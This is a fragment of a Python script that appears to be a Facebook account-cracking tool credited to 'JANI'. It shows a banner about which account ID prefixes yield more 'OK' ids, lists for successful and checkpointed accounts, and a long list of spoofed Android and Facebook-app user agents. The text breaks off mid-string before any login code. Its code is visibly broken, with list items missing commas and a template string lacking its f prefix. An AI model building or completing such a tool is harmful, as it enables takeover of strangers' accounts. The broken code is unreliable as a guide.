#coding = utf-8
#This Open-Source Script is Written by JANI Ali Khan
#Please Donot Forget to give Credit 
#Whatsapp : +923152056613
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd


try:
	import requests
except ImportError:
	os.system('pip install requests')


ses = requests.Session()

id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []


##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
#________________________________________#
def clear():
	os.system("clear")

def line():
	print(52*'-')
def p(x):
	print(x)

def logo():
	logo = (f'''\033[1;97m                                    
         88888    db    88b 88 88 
            \033[1;96m88   dPYb   88Yb88 88 
        o.  88  dP__Yb  88 Y88 88 
        \033[1;97m8bodP' dP8561Yb 88  Y8 88 

---------------------------------------------------
\033[1;97m AUTHOR  : MALIK SOHAIL :/
\033[1;97m GitHub : MR-JANI-906:/
\033[1;97m Version:\033[1;92m 1.9 \033[1;97m:/
\033[1;97m Status : PAID :/
\033[1;97m Notice : Use 100093/100092 For More OK Ids:/\033[1;97m
--------------------------------------------------
 \33[37;41m\t DEAR USERS NEED A GF� \33[0;m
\033[1;37m[!]  WIFI WORKING BRO AND USE OLD FILE WORKING:
---------------------------------------------------''')
	p(logo)



def iAmAndroidUa():
	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 9; moto e6 play Build/POA29.475-62-26)"
"Dalvik/2.1.0 (Linux; U; Android 7.0; TECNO CX Air Build/NRD90M)"
"Dalvik/2.1.0 (Linux; U; Android 10; CPH1933 Build/QKQ1.200209.002)"
"Dalvik/2.1.0 (Linux; U; Android 7.0; IF9002 Build/NRD90M)"
"Dalvik/2.1.0 (Linux; U; Android 10; SCV42 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 5.0.1; SAMSUNG-SGH-I537 Build/LRX22C)"
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; Nexus 10 Build/LMY49J)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; Swift 2 Build/OPM5.171019.017)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-N986U Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; LM-V350 Build/QKQ1.191222.002)"
"Dalvik/2.1.0 (Linux; U; Android 9; H3223 Build/50.2.A.3.55)"
"Dalvik/2.1.0 (Linux; U; Android 7.1.1; GIONEE F205 Build/N6F26Q)"
"Dalvik/1.6.0 (Linux; U; Android 4.3; Nexus 10 Build/JWR66Y)"
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 cruise Build/OCPS27.91-157-2)"
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SHV40 Build/S3290)"
"Dalvik/2.1.0 (Linux; U; Android 9; CPH2021 Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; A501 BRIGHT Build/LMY47D)"
"Dalvik/2.1.0 (Linux; U; Android 9; COR-AL10 Build/HUAWEICOR-AL10)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; moto e5 go Build/OPPS28.151-22-5-20)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G9860 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 9; octopus Build/R84-13099.102.0)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-T387V Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G885F Build/R16NW)"
"Dalvik/1.6.0 (Linux; U; Android 4.4.4; SM-T561Y Build/KTU84P)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; Micromax Q413 Build/LMY47D)"
"Dalvik/2.1.0 (Linux; U; Android 9; VOG-AL00 Build/HUAWEIVOG-AL00)"
"Dalvik/2.1.0 (Linux; U; Android 10; RMX1911 Build/QKQ1.200209.002)"
"Dalvik/2.1.0 (Linux; U; Android 6.0; iris50 Build/MRA58K)"
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; LG-K535 Build/MMB29M)"
"Dalvik/2.1.0 (Linux; U; Android 9; BQ-5535L Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; B450 Build/O11019)"
"Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3a Build/QQ3A.200805.001)"
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 play Build/ODP27.91-167-9-19)"
"Dalvik/2.1.0 (Linux; U; Android 10; Pixel 2 Build/QQ3A.200805.001)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-N986U1 Build/QP1A.190711.020)"
"Dalvik/1.6.0 (Linux; U; Android 4.2.1; R815 Build/JOP40D)"
"Dalvik/2.1.0 (Linux; U; Android 10; vivo 1910 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 9; motorola one macro Build/PMDS29.70-81-5)"
"Dalvik/2.1.0 (Linux; U; Android 6.0; X1 PLUS Build/MRA58K)"
"Dalvik/2.1.0 (Linux; U; Android 9; JAT-LX1 Build/HUAWEIJAT-LX1)"
"Dalvik/2.1.0 (Linux; U; Android 9; LM-K510 Build/PKQ1.190522.001)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J701M Build/M1AJQ)"
"Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) power Build/QPOS30.52-29-5)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-T595 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) power Build/QCO30.85-18)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-A715W Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-N986B Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; N8301 Build/O11019)"
"Dalvik/1.6.0 (Linux; U; Android 4.1.2; GT-I8552B Build/JZO54K)"
"Dalvik/2.1.0 (Linux; U; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; popper2 Build/O11019)"
"Dalvik/2.1.0 (Linux; U; Android 10; ALP-L29 Build/HUAWEIALP-L29S)"
"Dalvik/2.1.0 (Linux; U; Android 10; RMX1801 Build/QKQ1.191014.001)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; AL240 Build/O11019)"
"Dalvik/2.1.0 (Linux; U; Android 10; LM-K500 Build/QKQ1.200216.002)"
"Dalvik/2.1.0 (Linux; U; Android 9; KFMAWI Build/PS7315)"
"Dalvik/2.1.0 (Linux; U; Android 6.0; Ilium LT510 Build/MRA58K)"
"Dalvik/2.1.0 (Linux; U; Android 10; CPH1969 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; TX9 Pro Build/NHG47L)"
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925T Build/LMY47X)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-S111DL Build/QP1A.190711.020)"
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; A34 Build/KOT49H)"
"Dalvik/2.1.0 (Linux; U; Android 10; Nokia 6.2 Build/QKQ1.191014.001)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G885F Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; CPH1989 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 6.0; INTEX AQUA TREND LITE Build/MRA58K)"
"Dalvik/2.1.0 (Linux; U; Android 7.1.1; ZTE BLADE A6 Build/NMF26F)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-N981U Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; RMX2001 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook 15 (CB3-532) Build/R84-13099.110.0)"
"Dalvik/2.1.0 (Linux; U; Android 10; JNY-LX2 Build/HUAWEIJNY-L22)"
"Dalvik/2.1.0 (Linux; U; Android 9; Pearl K2 Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J200BT Build/LMY47X)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-A115AZ Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; SC-02M Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 9; U693CL Build/U693CL_01.01.05)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-T727V Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; O+ Crunch Build/LMY47D)"
"Dalvik/2.1.0 (Linux; U; Android 10; vivo 1907 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-N985F Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-P610 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 5.0.2; SM-G530FZ Build/LRX22G)"
"Dalvik/2.1.0 (Linux; U; Android 7.0; M5 Note Build/NRD90M)"
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; Nexus 9 Build/LMY48M)"
"Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PPBS29.73-81-16)"
"Dalvik/2.1.0 (Linux; U; Android 10; MAR-LX1M Build/HUAWEIMAR-L01MEA)"
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; HUAWEI SCL-L01 Build/HuaweiSCL-L01)"
"Dalvik/2.1.0 (Linux; U; Android 9; U202AA Build/P00610)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G950F Build/QQ2A.200405.005)"
"Dalvik/2.1.0 (Linux; U; Android 10; AC2001 Build/QKQ1.200412.002)"
"Dalvik/2.1.0 (Linux; U; Android 10; V2029 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI TAG-L23 Build/HUAWEITAG-L23)"
"Dalvik/2.1.0 (Linux; U; Android 10; Pixel 4 XL Build/QQ3A.200805.001)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; MUV Build/O11019)"
"Dalvik/1.6.0 (Linux; U; Android 4.4.2; EPICv2 Build/KOT49H)"
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; FIG-LX3 Build/HUAWEIFIG-LX3)"
"Dalvik/2.1.0 (Linux; U; Android 10; Pixel 4 Build/QQ3A.200805.001)"
"Dalvik/2.1.0 (Linux; U; Android 10; CPH1979 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; S60 Build/MMB29M)"
"Dalvik/2.1.0 (Linux; U; Android 6.0; LENNY3 Build/MRA58K)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; I4312 Build/54.0.A.6.50)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-A516U Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; TECNO IN1 Build/O11019)"
"Dalvik/2.1.0 (Linux; U; Android 10; J8110 Build/55.1.A.9.75)"
"Dalvik/2.1.0 (Linux; U; Android 10; motorola one hyper Build/QPFS30.103-43-7)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; 1001-G Go Build/OPM2.171019.012)"
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A500M Build/MMB29M)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; Neffos C7 Lite Build/O11019)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; Micromax Q417 Build/LMY47D)"
"Dalvik/2.1.0 (Linux; U; Android 10; Pixel 3a XL Build/QQ3A.200805.001)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; A30 Build/O11019)"
"Dalvik/2.1.0 (Linux; U; Android 9; SH-M12 Build/S927B)"
"Dalvik/2.1.0 (Linux; U; Android 9; ANE-LX2J Build/HUAWEIANE-L42J)"
"Dalvik/2.1.0 (Linux; U; Android 9; G5 Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-T867U Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; CPH1937 Build/QKQ1.200209.002)"
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; LGM-V300K Build/N2G47H)"
"Dalvik/2.1.0 (Linux; U; Android 9; KFKAWI Build/PMAIN1)"
"Dalvik/2.1.0 (Linux; U; Android 9; Dell Chromebook 11 (3180) Build/R84-13099.110.0)"
"Dalvik/1.6.0 (Linux; U; Android 4.2.2; PMP5785C_QUAD Build/JDQ39)"
"Dalvik/2.1.0 (Linux; U; Android 9; TECNO KC1 Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 9; Vivo XI+ Build/PPR1.180610.011)"
"Dalvik/1.6.0 (Linux; U; Android 4.2.2; N1T Build/JDQ39)"
"Dalvik/2.1.0 (Linux; U; Android 10; vivo 1818 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; BV9500 Build/O11019)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; Coolpad 3310A Build/3310A.SPRINT.200813.0S)"
"Dalvik/1.6.0 (Linux; U; Android 4.2.2; GT-S5660 Build/JDQ39E)"
"Dalvik/2.1.0 (Linux; U; Android 10; ALP-L09 Build/HUAWEIALP-L09S)"
"Dalvik/2.1.0 (Linux; U; Android 9; moto e6 (XT2005DL) Build/PPBS29.73-52-15)"
"Dalvik/1.6.0 (Linux; U; Android 5.1; LG-H818 ) baiduboxapp/11.11.0.12 (Baidu; P1 5.1)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-G977N Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 9; vivo 1916 Build/PKQ1.190626.001)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-A705GM Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-J400M Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI CUN-L01 Build/HUAWEICUN-L01)"
"Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A7 2020 Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 10; CPH1919 Build/QKQ1.191021.002)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-T515 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 9; TA-1020 Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 7.0; VIA_S10 Build/NRD90M)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; DUA-LX3 Build/HONORDUA-LX3)"
"Dalvik/2.1.0 (Linux; U; Android 9; moto g(8) plus Build/PPIS29.65-51-7)"
"Dalvik/2.1.0 (Linux; U; Android 5.0.2; Lenovo K30-W Build/LRX22G)"
"Dalvik/2.1.0 (Linux; U; Android 10; CPH1941 Build/QKQ1.200209.002)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-A115A Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 7.1.2; GOTIT Build/NHG47L)"
"Dalvik/1.6.0 (Linux; U; Android 4.3; SM-S766C Build/JSS15J)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; Lenovo TB-7104I Build/O11019)"
"Dalvik/2.1.0 (Linux; U; Android 9; VKY-L09 Build/HUAWEIVKY-L09)"
"Dalvik/2.1.0 (Linux; U; Android 9; U693CL Build/U693CL_01.01.07)"
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; IKALL Build/MOB30R)"
"Dalvik/2.1.0 (Linux; U; Android 10; XQ-AU51 Build/59.0.A.8.21)"
"Dalvik/2.1.0 (Linux; U; Android 9; SM-T825Y Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 9; moto g(8) power lite Build/POD29.349-2)"
"Dalvik/2.1.0 (Linux; U; Android 9; SKW-H0 Build/SKYW1905210OS00MP2)"
"Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) supra Build/PCOS29.114-134-20)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; REVVL 2 Build/OPM1.171019.011)"
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; ZTE A2017G Build/OPR1.170623.032)"
"Dalvik/2.1.0 (Linux; U; Android 10; ASUS_X01BDA Build/QKQ1)"
"Dalvik/2.1.0 (Linux; U; Android 10; CLT-L04 Build/HUAWEICLT-L04)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-A015G Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; vivo 1917 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; Pixel 4 Build/QD1A.190821.011)"
"Dalvik/2.1.0 (Linux; U; Android 9; cp3705A Build/3705A.MPCS.200817.0D)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; vivo 1817 Build/OPM1.171019.026)"
"Dalvik/2.1.0 (Linux; U; Android 9; 5048I Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 10; MED-LX9 Build/HUAWEIMED-LX9)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; Fusion5_F104E Build/OPM8.181105.002)"
"Dalvik/2.1.0 (Linux; U; Android 6.0.1; maxwell Build/MXC89L)"
"Dalvik/2.1.0 (Linux; U; Android 10; LM-V500N Build/QKQ1.191021.002)"
"Dalvik/2.1.0 (Linux; U; Android 7.0; SENSEIT R500 Build/NRD90M)"
"Dalvik/2.1.0 (Linux; U; Android 7.0; Micromax Q409 Build/NRD90M)"
"Dalvik/2.1.0 (Linux; U; Android 9; ASUS_X01AD Build/WW_Phone-202008201135)"
"Dalvik/2.1.0 (Linux; U; Android 7.0; F3212 Build/36.1.A.1.86)"
"Dalvik/1.6.0 (Linux; U; Android 4.4.4; XT1039 Build/KXB21.14-L1.46)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; LGL423DL Build/OPM1.171019.026)"
"Dalvik/2.1.0 (Linux; U; Android 10; Mi 9T Build/QQ3A.200705.002)"
"Dalvik/2.1.0 (Linux; U; Android 11; Pixel 3a Build/RP1A.200720.009)"
"Dalvik/2.1.0 (Linux; U; Android 9; E6910 Build/4.601VZ.0191.a)"
"Dalvik/2.1.0 (Linux; U; Android 10; moto g(7) Build/QPUS30.52-23-7)"
"Dalvik/2.1.0 (Linux; U; Android 10; Pixel 2 XL Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-A015V Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G977N Build/NRD90M)"
"Dalvik/2.1.0 (Linux; U; Android 10; MAR-LX1A Build/HUAWEIMAR-L21MEB)"
"Dalvik/2.1.0 (Linux; U; Android 7.1.1; Moto E (4) Plus Build/NCRS26.58-44-25)"
"Dalvik/2.1.0 (Linux; U; Android 10; ART-L28 Build/HUAWEIART-L28)"
"Dalvik/2.1.0 (Linux; U; Android 10; moto g power Build/QPMS30.80-51-5)"
"Dalvik/2.1.0 (Linux; U; Android 10; CPH1911 Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-A115M Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 9; motorola one macro Build/PMDS29.70-37-1-2)"
"Dalvik/2.1.0 (Linux; U; Android 9; SOV40 Build/55.0.C.0.475)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; VLE5 Build/OPM1.171019.011)"
"Dalvik/2.1.0 (Linux; U; Android 8.1.0; BBB100-7 Build/OPM1.171019.026)"
"Dalvik/2.1.0 (Linux; U; Android 8.0.0; LG-H873 Build/OPR1.170623.032)"
"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SGP312 Build/10.7.A.0.222)"
"Dalvik/2.1.0 (Linux; U; Android 10; SOG01 Build/58.0.C.7.41)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-A015M Build/QP1A.190711.020)"
"Dalvik/2.1.0 (Linux; U; Android 10; SM-M205F Build/QP1A.190711.020) gzip(gfe)"
"Dalvik/2.1.0 (Linux; U; Android 9; TX5 plus Build/PPR1.180610.011)"
"Dalvik/2.1.0 (Linux; U; Android 9; moto x4 Build/PPWS29.69-39-6-11)"
"Dalvik/2.1.0 (Linux; U; Android 11; Pixel 3 XL Build/RP1A.200720ub"#504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v37003402930565689 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 RuxitSynthetic/1.0 v3525134327834240278 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v5571404649910827233 t7454547885219621689 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15215978473 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8356872843420553543 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740603319 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 RuxitSynthetic/1.0 v5043633743419663969 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7994796855276585536 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6030128622839186006 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7875292909063374579 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216080501 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v117949514735453019 t1479978021737656703 ath4b3726d5 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740627228 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v8193078289109210550 t3659150847447165606 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6674022040617389791 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v1930726795496505614 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v825316463071835855 t3428360957270603442 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216148705 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v6177520797700783033 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v1167237561826244614 t4109306862226254733 athe94ac249 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4740651128 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v6548651494991813410 t1865758485807943117 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1635317657169688114 t108896256523930349 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 RuxitSynthetic/1.0 v799284131744665025 t8093092299234304605 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4638746326389231947 t894544887429309181 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v7009351797327972341 t1171836933865741988 ath2653ab72 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v2373076866650673365 t4961339301207929308 ath259cea6f altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v7605812789465101837 t2143354459458917537 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216247350 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v5376638030390363943 t3426302838546509975 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v9141737963419875314 t7527522693257895152 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v1377525953552160267 t2513504243886480416 ath5ee645e0 altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 RuxitSynthetic/1.0 v4740674362 t2396816172471358041 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v4123109437764068959 t3891685320802505868 ath1fb31b7a altpriv cvcv=2 smf=0","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 RuxitSynthetic/1.0 v15216315572 t4359033847046230594 athfa3c3975 altpub cvcv=2 smf=0","Mozilla/5.0 